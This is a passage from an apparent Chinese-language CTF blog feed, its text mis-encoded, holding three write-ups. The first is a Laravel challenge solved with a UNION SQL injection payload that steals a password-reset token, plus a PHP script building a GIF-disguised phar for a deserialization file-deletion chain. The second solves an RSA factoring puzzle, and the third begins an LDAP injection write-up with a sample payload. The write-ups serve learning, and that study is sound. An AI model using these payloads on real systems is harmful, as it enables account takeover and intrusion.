´è§£å‡ºåŸå¯†ç æ˜¯ä»€ä¹ˆâ€¦</p><p>æˆ‘ä»¬çœ‹åˆ°äº†é‡ç½®å¯†ç çš„ä»£ç ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-1168a4b6c26e0ba4.png" alt="image.png"></p><p>å…³äº laravel æ¡†æ¶é‡ç½®å¯†ç ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹æ–‡æ¡£ï¼š<br><a href="https://laravel-china.org/docs/laravel/5.6/passwords/1384">https://laravel-china.org/docs/laravel/5.6/passwords/1384</a></p><p>å¤§ä½“æµç¨‹æ˜¯ç‚¹å‡»é‡ç½®å¯†ç ï¼Œè¾“å…¥ç®¡ç†å‘˜é‚®ç®±ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªç®¡ç†å‘˜è´¦å·çš„ token ï¼Œè¾“å…¥ email å’Œå¯¹åº”çš„ token ï¼Œå°±å¯ä»¥è®¿é—® /password/reset/token é‡ç½®å¯†ç ï¼Œtoken æ€ä¹ˆå¾—çŸ¥å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬çœ‹åˆ° email å’Œ token éƒ½å­˜å…¥äº†æ•°æ®åº“é‡Œï¼Œè€Œæˆ‘ä»¬æœ‰æ³¨å…¥ç‚¹ï¼Œæ•°æ®åº“æ‰€æœ‰ä¿¡æ¯éƒ½å¯ä»¥æ‹¿åˆ°ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬ç‚¹å‡»é‡ç½®å¯†ç ï¼Œè¾“å…¥ç®¡ç†å‘˜é‚®ç®±ã€‚å†å»æ•°æ®åº“é‡Œæ‹¿ tokenï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-984eda8a212bc86e.png" alt="image.png"></p><p>payload:<br><code>admin&#39;union select 1,(select token from password_resets where email=&#39;admin@qvq.im&#39;),3,4,5#</code><br>å»è®¿é—®ï¼š<br><code>http://192.168.146.145:2333/password/reset/8eea41c7ef5cdf968941d07b321722a70c8bc89086d0149979e7ec91d5c07870</code></p><p>é‡ç½®å¯†ç ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-424e6d563fbb7522.png" alt="image.png"></p><p>æˆåŠŸç™»å…¥ç®¡ç†å‘˜ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-d897e1c5d8acc362.png" alt="image.png"></p><p>flag éƒ¨åˆ†æ˜¾ç¤º no flagã€‚<br>æˆ‘ä»¬çœ‹ä¸€ä¸‹ flag éƒ¨åˆ†çš„æ§åˆ¶å™¨ï¼Œå‘ç°æ˜æ˜æ˜¾ç¤ºäº† flagï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-b7f474853b7ffbe5.png" alt="image.png"></p><p>è¿™é‡Œçš„è€ƒç‚¹æ˜¯ Blade æ¨¡æ¿ç¼“å­˜ï¼Œæ—§ç¼“å­˜æ²¡æœ‰åˆ é™¤ï¼Œæˆ‘ä»¬æ— æ³•çœ‹åˆ° flagï¼Œå‚è€ƒ<a href="https://www.jianshu.com/p/7d65f9eb94be">è¿™ç¯‡</a></p><p>æ‰€ä»¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯åˆ é™¤ç¼“å­˜æ–‡ä»¶ï¼Œè¯»åˆ° flagï¼Œé¦–å…ˆè¦æ‰¾åˆ°ç¼“å­˜æ–‡ä»¶ã€‚</p><p>ç¼“å­˜æ–‡ä»¶çš„åå­—æ˜¯laravelè‡ªåŠ¨ç”Ÿæˆçš„ï¼Œç”Ÿæˆæ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCompiledPath</span>(<span class="params">$path</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cachePath.<span class="string">&#x27;/&#x27;</span>.sha1($path).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ $path å°±æ˜¯æ¨¡æ¿çš„ä½ç½®ï¼Œæ˜¯** /usr/share/nginx/html/resources/views/auth/flag.blade.php **</p><p>nginx çš„é»˜è®¤ç½‘ç«™æ ¹ç›®å½•æ˜¯ /usr/share/nginx/htmlï¼Œè€Œä»<a href="https://www.jianshu.com/p/018c83d6b38c">è¿™ç¯‡åšå®¢</a>å¾—çŸ¥ç¼“å­˜æ–‡ä»¶æ”¾åœ¨ /storage/framework/viewsï¼ŒåŠ ä¸Š sha1 ç®—æ³•ï¼Œæ‰€ä»¥æœ€åè·¯å¾„æ˜¯ï¼š</p><blockquote><p>/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php</p></blockquote><p>æœ‰äº†è·¯å¾„ï¼Œæ€ä¹ˆå»åˆ é™¤å‘¢ï¼Ÿ</p><p>åˆ©ç”¨ composer çš„å„ç§ä¾èµ–ï¼Œå‚è€ƒ<a href="https://pigjian.com/article/composer-laravel-package-of-local-development">è¿™ç¯‡</a> å®‰è£…ç»„ä»¶ã€‚(å¯ä»¥åˆ©ç”¨ è´´å‡ºçš„ docker åœ°å€é‡Œçš„ composer.pharï¼Œä¹Ÿå¯ä»¥æ·»åŠ ç¯å¢ƒå˜é‡ç”¨ composer install å®‰è£…)</p><p>çœ‹ä¸€ä¸‹<strong>composer</strong>,æœç´¢ unlike ï¼Œå‘ç°äº†åœ¨<strong>Swift_ByteStream_TemporaryFileByteStream</strong>çš„ææ„å‡½æ•°æœ‰ unlikeï¼Œé‚£åº”è¯¥æ˜¯é€šè¿‡ååºåˆ—åŒ–æ¼æ´æ¥æ‰§è¡Œææ„å‡½æ•°åˆ é™¤ç¼“å­˜ï¼Œåœ¨å“ªé‡Œè§¦å‘ååºåˆ—åŒ–å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬åœ¨ check è¿™é‡Œå‘ç°äº† file_existsï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">Request $request</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $path = $request-&gt;input(<span class="string">&#x27;path&#x27;</span>, <span class="keyword">$this</span>-&gt;path);</span><br><span class="line">    $filename = $request-&gt;input(<span class="string">&#x27;filename&#x27;</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span>($filename)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($path . $filename))&#123;</span><br><span class="line">            Flash::error(<span class="string">&#x27;ç£ç›˜æ–‡ä»¶å·²åˆ é™¤ï¼Œåˆ·æ–°æ–‡ä»¶åˆ—è¡¨&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            Flash::success(<span class="string">&#x27;æ–‡ä»¶æœ‰æ•ˆ&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> redirect(route(<span class="string">&#x27;files&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨åˆ°äº† phar:// ååºåˆ—çš„æ–¹æ³•ï¼Œå¯ä»¥å‚è€ƒ<a href="https://xz.aliyun.com/t/2715">è¿™ç¯‡æ–‡ç« </a></p><p>è¿™æ ·æˆ‘ä»¬æ„é€  phar åŒ…ï¼Œä»¥ä¸‹æ˜¯æ„é€ çš„ php ä»£ç ï¼š</p><p><strong>æ³¨æ„ä¸€ä¸‹ï¼š</strong>éœ€è¦å°† php.ini ä¸­çš„ phar.readonly é€‰é¡¹è®¾ç½®ä¸ºoffï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆ phar æ–‡ä»¶(php.iniä¸­ä¿®æ”¹æ˜¯è®°å¾—æŠŠå‰é¢çš„â€;â€å»æ‰ï¼Œæˆ‘å°±æ˜¯ä¸€åªæ²¡å»æ‰åˆ†å·è€Œä¸€ç›´ä¿®æ”¹ä¸æˆåŠŸ)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Write sequence.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $sequence = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * StreamFilters.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_StreamFilter[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $filters = [];</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A buffer for writing.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $writeBuffer = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bound streams.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_InputByteStream[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $mirrors = [];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_FileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="comment">/** The internal pointer offset */</span></span><br><span class="line">    <span class="keyword">private</span> $_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The path to the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_path;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The mode this file is opened in for writing */</span></span><br><span class="line">    <span class="keyword">private</span> $_mode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for reading the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_reader;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for writing the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_writer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** If magic_quotes_runtime is on, this will be true */</span></span><br><span class="line">    <span class="keyword">private</span> $_quotes = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** If stream is seekable true/false, or null if not known */</span></span><br><span class="line">    <span class="keyword">private</span> $_seekable = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new FileByteStream for $path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $path</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bool   $writable if true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$path, $writable = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_path = $path;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_mode = $writable ? <span class="string">&#x27;w+b&#x27;</span> : <span class="string">&#x27;rb&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (function_exists(<span class="string">&#x27;get_magic_quotes_runtime&#x27;</span>) &amp;&amp; @get_magic_quotes_runtime() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_quotes = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the complete path to the file.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPath</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $filePath = <span class="string">&quot;/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php&quot;</span>;</span><br><span class="line">        <span class="built_in">parent</span>::__construct($filePath, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;getPath())) &#123;</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;getPath());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> Swift_ByteStream_TemporaryFileByteStream();</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">&#x27;./1.phar&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line">$p-&gt;setMetadata($obj);</span><br><span class="line">$p-&gt;addFromString(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">&#x27;./1.phar&#x27;</span>, <span class="string">&#x27;1.gif&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨ç›®å½•ä¸‹ä¼šç”Ÿæˆä¸€ä¸ª 1.gif æ–‡ä»¶ï¼Œä¸Šä¼ ä¸Šå»ï¼Œå‘ç°æ–‡ä»¶åˆ—è¡¨æœ‰äº†è¿™ä¸ªæ–‡ä»¶ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-48e90640ead8c229.png" alt="image.png"></p><p>ç„¶å check ä¸€ä¸‹ï¼Œæ³¨æ„è¦æŠ“åŒ…ï¼Œæ·»åŠ ä¸€ä¸‹ path å‚æ•°ï¼Œè¯¦æƒ…çœ‹ä¸Šé¢ç»™å‡ºçš„ check éƒ¨åˆ†çš„ä»£ç ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-aa1be94a39dd4dd5.png" alt="image.png"></p><p><code>path=phar:///usr/share/nginx/html/storage/app/public</code></p><p>è§¦å‘ååºåˆ—åŒ–ï¼Œåˆ é™¤ç¼“å­˜æ–‡ä»¶ï¼Œè®¿é—® flag å°±å¯ä»¥çœ‹åˆ° flag äº†ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-d556ca0fac6a99b8.png" alt="image.png"></p><p>å‚è€ƒï¼š</p><ol><li><p><a href="https://www.kingkk.com/2018/10/%E6%8A%A4%E7%BD%91%E6%9D%AF-web/">https://www.kingkk.com/2018/10/%E6%8A%A4%E7%BD%91%E6%9D%AF-web/</a></p></li><li><p><a href="http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/">http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/</a></p></li><li><p><a href="http://www.venenof.com/index.php/archives/565/">http://www.venenof.com/index.php/archives/565/</a></p></li></ol><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>web æ‰‹å·²åºŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSAçš„ä¸€ä¸ªå°trick</title>
      <link href="/2018/10/14/RSA%E2%80%94%E2%80%94trick/"/>
      <url>/2018/10/14/RSA%E2%80%94%E2%80%94trick/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘é‡åˆ°äº†ä¸€ä¸ª RSA çš„é—®é¢˜ï¼Œæ¶‰åŠä¸€ä¸ªå°å°çš„ trick ï¼Œè®°å½•ä¸€ä¸‹ã€‚</p><p>é¢˜ç›®æ¡ä»¶å¦‚ä¸‹ï¼š</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e&#x3D;65537</span><br><span class="line">n1&#x3D;23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154545949713245271655372366964733467694911683404472839031932865195076679363440004259157441442904092160547940620462275523928770007343760308099893870201392965037704560065286860197211399375405419620507897112217284427055511050820476779226202266877872708788417574738346625361066145535064835057037859284000257460115692751L</span><br><span class="line">n2&#x3D;23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154673727252437046185126099084752843732400209032782207790902956024459189700856089587545302854326571561755007254420608514135036673700243280752364319986331493694769729841789115612749641973878393284804681876299531933348630664123809944975501332215753682284226293973903784246618067269627749460102002825975011735463170307L</span><br><span class="line">encrypt&#x3D;18605789682603602447496491798717321758798293700581905324029316650457391496265655270825055100678097929357061608642146193773598093988238186832894784951616085628646685595376101261377731258729834390380505295109894703902052847643842156614062711247564519297808798554671766259798926540994634858657655351713982599673967765484141456377356967352743349134262973092564982272405212241089526282547070247316071159193009664342169931360323767519419547890738439815871541842638219161372841320792826512207337857015266817573319095062799628537492791048391092577478382005012019416835632572465215950053539506334972912038960318318733757235757L</span><br></pre></td></tr></table></figure><p>å‘ç°ç»™äº†ä¸¤ä¸ª nï¼Œä¸€ä¸ªå¯†æ–‡ï¼Œé‚£å°±æ˜¯æ ¹æ®ä¸¤ä¸ª n æ¥è®¡ç®—ç§é’¥ã€‚<br>é¦–å…ˆå°è¯•åˆ†è§£ä¸¤ä¸ª nï¼Œn1 æ— æœï¼Œn2 åˆ†å‡ºä¸€éƒ¨åˆ†ç´ å› æ•°ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-30f8ea24352ecb27.png" alt="image.png"></p><p>æ˜¾ç„¶ n2 ä¸æ˜¯ä¸¤ä¸ªç´ å› æ•°ç›¸ä¹˜ï¼Œå¯ä»¥çŒœæµ‹ n1 æ˜¯åŠ å¯†æ‰€ç”¨çš„ nã€‚ä»”ç»†è§‚å¯Ÿ n1 å’Œ n2 çš„é«˜ä½éƒ½ç›¸åŒï¼Œç›¸è¿‘ï¼ŒçŒœæµ‹n2å¯èƒ½æ˜¯ä¾æ® n1 çš„ p å’Œ q ç”Ÿæˆï¼š</p><blockquote><p>n1 = p * q<br>n2 = (p + x) * (q + y)</p></blockquote><p>è¿™æ ·çš„è¯ï¼Œå¯ä»¥æ¨å¯¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p * q &#x3D; n1</span><br><span class="line">(p + x)(q + y) &#x3D; n2</span><br><span class="line">-&gt; x * y + p * y + q * x &#x3D; t (t &#x3D; n2 - n1)</span><br><span class="line">-&gt; x * q^2 + (x * y - t) * q + n * y &#x3D; 0</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹ç¨‹æœ‰ç´ æ•°è§£å³å¯ï¼Œå¯çˆ†ç ´ x å’Œ yï¼Œå†™å‡ºè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n1=<span class="number">23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154545949713245271655372366964733467694911683404472839031932865195076679363440004259157441442904092160547940620462275523928770007343760308099893870201392965037704560065286860197211399375405419620507897112217284427055511050820476779226202266877872708788417574738346625361066145535064835057037859284000257460115692751L</span></span><br><span class="line">n2=<span class="number">23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154673727252437046185126099084752843732400209032782207790902956024459189700856089587545302854326571561755007254420608514135036673700243280752364319986331493694769729841789115612749641973878393284804681876299531933348630664123809944975501332215753682284226293973903784246618067269627749460102002825975011735463170307L</span></span><br><span class="line">encrypt=<span class="number">18605789682603602447496491798717321758798293700581905324029316650457391496265655270825055100678097929357061608642146193773598093988238186832894784951616085628646685595376101261377731258729834390380505295109894703902052847643842156614062711247564519297808798554671766259798926540994634858657655351713982599673967765484141456377356967352743349134262973092564982272405212241089526282547070247316071159193009664342169931360323767519419547890738439815871541842638219161372841320792826512207337857015266817573319095062799628537492791048391092577478382005012019416835632572465215950053539506334972912038960318318733757235757L</span></span><br><span class="line"></span><br><span class="line">t=n2-n1</span><br><span class="line">f1 = <span class="keyword">lambda</span> x, y: <span class="built_in">pow</span>(x * y - t, <span class="number">2</span>) - <span class="number">4</span> * n1 * x * y</span><br><span class="line">f2 = <span class="keyword">lambda</span> x, y, s: (t - x * y - s) / (<span class="number">2</span> * x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">3000</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">3000</span>):</span><br><span class="line">        <span class="built_in">print</span> x,y</span><br><span class="line">        <span class="keyword">if</span> f1(x, y) &gt;= <span class="number">0</span>:</span><br><span class="line">            s, b = gmpy2.iroot(f1(x, y), <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span> b:</span><br><span class="line">                <span class="keyword">if</span> gmpy2.is_prime(f2(x,y,<span class="built_in">int</span>(s))):</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&quot;Success&quot;</span></span><br><span class="line">                    p=f2(x,y,<span class="built_in">int</span>(s))</span><br><span class="line">                    q=n1/p</span><br><span class="line">                    d=gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">                    <span class="built_in">print</span> libnum.n2s(<span class="built_in">pow</span>(encrypt,d,n1))</span><br><span class="line">                    exit()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è§£å‡ºæ˜æ–‡ã€‚</p><p>å‚è€ƒï¼š<br><a href="https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/">https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 CSAW</title>
      <link href="/2018/10/05/2018CSAW/"/>
      <url>/2018/10/05/2018CSAW/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰9æœˆä»½äº‹æƒ…å¾ˆå¤šæ²¡æœ‰æ‰“CSAW ï¼Œå¬è¯´é¢˜è´¨é‡ä¸é”™å°±å»åšäº†åšï¼Œä¸ä¼šçš„å°±å»å¤ç°äº†ä¸€æ³¢ï¼Œè·Ÿç€å¸ˆå‚…ä»¬çš„wpå­¦åˆ°äº†ä¸å°‘ä¸œè¥¿ã€‚</p><a id="more"></a><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Ldab"><a href="#Ldab" class="headerlink" title="Ldab"></a>Ldab</h4><p>è¿™é“é¢˜å¼€å§‹åšçš„æ—¶å€™è¯•äº†ä¸€æ³¢æ³¨å…¥å§¿åŠ¿ï¼Œæ²¡æœ‰ä»€ä¹ˆåµç”¨ï¼Œåæ¥æ‰çŸ¥é“è€ƒå¯Ÿçš„æ˜¯ LDAP çš„æ³¨å…¥ã€‚</p><p>å…³äº LDAP åŠæ³¨å…¥çš„çŸ¥è¯†ç‚¹ï¼Œå¯ä»¥å‚è€ƒè¿™å‡ ç¯‡åšå®¢ï¼š</p><ol><li><p><a href="https://www.jianshu.com/p/d94673be9ed0">https://www.jianshu.com/p/d94673be9ed0</a></p></li><li><p><a href="http://blog.51cto.com/407711169/1439623">http://blog.51cto.com/407711169/1439623</a></p></li><li><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20injection"> LDAP æ³¨å…¥å¸¸ç”¨payload</a></p></li></ol><p>çœ‹è¿™é“é¢˜ï¼Œflag åº”è¯¥å°±è—åœ¨æŸä¸€é¡¹ä¸­ï¼Œè¯•ä¸€ä¸‹æŸ¥å‡ºæ‰€æœ‰é¡¹ï¼š</p><blockquote><p>*)(uid=*</p></blockquote><p>æ²¡æœ‰ flagï¼Œåº”è¯¥æ˜¯åšäº†ä»€ä¹ˆè¿‡æ»¤ï¼ŒçŒœæµ‹åå°æŸ¥è¯¢è¯­å¥å¯èƒ½æ˜¯è¿™æ ·çš„ï¼š</p><blockquote><p>(&amp;(name=è¾“å…¥)(name!=flag))</p></blockquote><p>åœ¨&amp;çš„æ¡ä»¶ä¸‹ï¼Œæˆ‘ä»¬çš„ payload 